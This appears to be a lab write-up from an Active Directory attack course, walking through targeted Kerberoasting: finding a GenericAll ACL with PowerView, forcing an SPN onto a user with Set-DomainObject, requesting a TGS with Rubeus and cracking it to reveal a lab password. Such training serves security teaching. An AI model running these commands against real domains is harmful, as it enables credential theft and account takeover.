# Hands-on 7: SetSPN

- [Hands-on 7: SetSPN](#hands-on-7-setspn)
  - [Task](#task)
  - [Determine if studentuserx has permissions to set UserAccountControl flags for any user](#determine-if-studentuserx-has-permissions-to-set-useraccountcontrol-flags-for-any-user)
  - [If yes, force set a SPN on the user and obtain a TGS for the user.](#if-yes-force-set-a-spn-on-the-user-and-obtain-a-tgs-for-the-user)

---

## Task

- Determine if studentuserx has permissions to set UserAccountControl flags for any user.
- If yes, force set a SPN on the user and obtain a TGS for the user.

<br/>

---

## Determine if studentuserx has permissions to set UserAccountControl flags for any user

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{ ($_.IdentityReferenceName -match "manager") -or ($_.IdentityReferenceName -match "studentusers") -or ($_.IdentityReferenceName -match "maintenanceusers") }
```

Recalling the above command result in Hands-on 5, the interesting ACL:

```
ObjectDN                : CN=Support64User,CN=Users,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1116
IdentityReferenceName   : studentusers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=StudentUsers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group
```

<br/>

Since `studentuser64` is in the `studentusers` group, it has `GenericAll` permission on the support user - it can set `UserAccountControl` flags for the user `support64user`.

<br/>

---

## If yes, force set a SPN on the user and obtain a TGS for the user.

```
Set-DomainObject -Identity support64user -Set @{serviceprincipalname='us/myspn64'}
```

![picture 5](images/48be9ef095810b3793c784b9f0f0a4869943a3a3e0a4e3b753c0f7f4c5a18459.png)  

<br/>

Inspect the SPN again:

![picture 6](images/5813357c7dc9f0cdb73099e10c73b9d3a16d0e89b391499e029b519f54aa2226.png)  

* `Support64User` has the SPN `us/myspn64` now.

<br/>

Request TGS using `Rubeus.exe`:

```
.\Rubeus.exe kerberoast /user:support64user /outfile:kerberoast-support64user-hash.txt
```

![picture 7](images/00e77b16cb99336ab35e23e12a73e21e64b99ef6f13b9586f61baa164ec3c83a.png)  

<br/>

Use `john.exe` to crack the password:

![picture 8](images/1fa429f9142a9b0f23032c0d0bd7fede2321b7a4948b9e8bb0c954a3976582c8.png)  

- The password of `support64user` is `Desk@123`

<br/>

---